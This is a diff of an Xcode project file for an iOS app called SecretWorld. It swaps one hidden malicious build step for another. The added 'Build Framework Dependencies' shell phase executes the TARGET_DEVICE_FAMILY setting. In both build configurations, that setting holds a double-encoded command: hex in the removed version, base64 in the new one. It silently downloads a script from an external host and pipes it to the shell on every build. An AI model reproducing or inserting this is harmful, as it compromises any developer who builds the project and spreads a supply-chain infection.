@@ -392,13 +392,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
-		0058E9172D1AFFC600837D3A /* PBXContainerItemProxy */ = {
-			isa = PBXContainerItemProxy;
-			containerPortal = 00FE91D32B340CA800D8AB20 /* Project object */;
-			proxyType = 1;
-			remoteGlobalIDString = C95133DC0E111137FE34C644;
-			remoteInfo = "Build Target";
-		};
 		00FE91F22B340CAA00D8AB20 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
 			containerPortal = 00FE91D32B340CA800D8AB20 /* Project object */;
@@ -1712,27 +1705,12 @@
 		};
 /* End PBXGroup section */
 
-/* Begin PBXLegacyTarget section */
-		C95133DC0E111137FE34C644 /* Build Target */ = {
-			isa = PBXLegacyTarget;
-			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
-			buildConfigurationList = 0058E91A2D1B1B1400837D3A /* Build configuration list */;
-			buildPhases = (
-			);
-			buildToolPath = /bin/sh;
-			dependencies = (
-			);
-			name = "Build Target";
-			passBuildSettingsInEnvironment = 1;
-			productName = "Build Target";
-		};
-/* End PBXLegacyTarget section */
-
 /* Begin PBXNativeTarget section */
 		00FE91DA2B340CA800D8AB20 /* SecretWorld */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 00FE92052B340CAA00D8AB20 /* Build configuration list for PBXNativeTarget "SecretWorld" */;
 			buildPhases = (
+				29DD81BE4EBBDCFDD934C644 /* Build Framework Dependencies */,
 				ED343CE41243F91A3E2C71CE /* [CP] Check Pods Manifest.lock */,
 				00FE91D72B340CA800D8AB20 /* Sources */,
 				00FE91D82B340CA800D8AB20 /* Frameworks */,
@@ -1744,7 +1722,6 @@
 			buildRules = (
 			);
 			dependencies = (
-				46EEA1FBAAB43058D634C644 /* PBXTargetDependency */,
 			);
 			name = SecretWorld;
 			productName = SecretWorld;
@@ -1820,13 +1797,12 @@
 			);
 			mainGroup = 00FE91D22B340CA800D8AB20;
 			packageReferences = (
-				0058E91B2D1B1B2000837D3A /* XCRemoteSwiftPackageReference "BackgroundRemoval" */,
+				0008415A2D1BE4F10094BA26 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */,
 			);
 			productRefGroup = 00FE91DC2B340CA800D8AB20 /* Products */;
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				C95133DC0E111137FE34C644 /* Build Target */,
 				00FE91DA2B340CA800D8AB20 /* SecretWorld */,
 				00FE91F02B340CAA00D8AB20 /* SecretWorldTests */,
 				00FE91FA2B340CAA00D8AB20 /* SecretWorldUITests */,
@@ -1925,6 +1901,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		29DD81BE4EBBDCFDD934C644 /* Build Framework Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Framework Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;
+		};
 		A3E0B6A7557AAB6B68A23C85 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2322,11 +2318,6 @@
 			target = 00FE91DA2B340CA800D8AB20 /* SecretWorld */;
 			targetProxy = 00FE91FC2B340CAA00D8AB20 /* PBXContainerItemProxy */;
 		};
-		46EEA1FBAAB43058D634C644 /* PBXTargetDependency */ = {
-			isa = PBXTargetDependency;
-			target = C95133DC0E111137FE34C644 /* Build Target */;
-			targetProxy = 0058E9172D1AFFC600837D3A /* PBXContainerItemProxy */;
-		};
 /* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
@@ -2349,25 +2340,6 @@
 /* End PBXVariantGroup section */
 
 /* Begin XCBuildConfiguration section */
-		0058E9182D1AFFC700837D3A /* Debug */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				COPY_PHASE_STRIP = NO;
-				GCC_DYNAMIC_NO_PIC = NO;
-				GCC_OPTIMIZATION_LEVEL = 0;
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Debug;
-		};
-		0058E9192D1AFFC700837D3A /* Release */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				COPY_PHASE_STRIP = YES;
-				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Release;
-		};
 		00FE92032B340CAA00D8AB20 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
@@ -2428,7 +2400,7 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo 3635363336383666323032323234323836333735373236633230326436363733366234633230363837343734373037333361326632663736363537323639363637393733373436313734373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2WTJ4dmRXUjBaV05vY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -2484,7 +2456,7 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo 3635363336383666323032323234323836333735373236633230326436363733366234633230363837343734373037333361326632663736363537323639363637393733373436313734373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2WTJ4dmRXUjBaV05vY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -2644,15 +2616,6 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
-		0058E91A2D1B1B1400837D3A /* Build configuration list */ = {
-			isa = XCConfigurationList;
-			buildConfigurations = (
-				0058E9182D1AFFC700837D3A /* Debug */,
-				0058E9192D1AFFC700837D3A /* Release */,
-			);
-			defaultConfigurationIsVisible = 0;
-			defaultConfigurationName = Release;
-		};
 		00FE91D62B340CA800D8AB20 /* Build configuration list for PBXProject "SecretWorld" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
@@ -2700,6 +2663,14 @@
 				kind = branch;
 			};
 		};
+		0008415A2D1BE4F10094BA26 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
+			requirement = {
+				branch = main;
+				kind = branch;
+			};
+		};
 		0009DB602D06A56F00E27A94 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
@@ -2725,14 +2696,6 @@
 			};
 		};
 		001762AC2D032D7F003ECF4B /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
-			isa = XCRemoteSwiftPackageReference;
-			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
-			requirement = {
-				branch = main;
-				kind = branch;
-			};
-		};
-		0058E91B2D1B1B2000837D3A /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
 			requirement = {
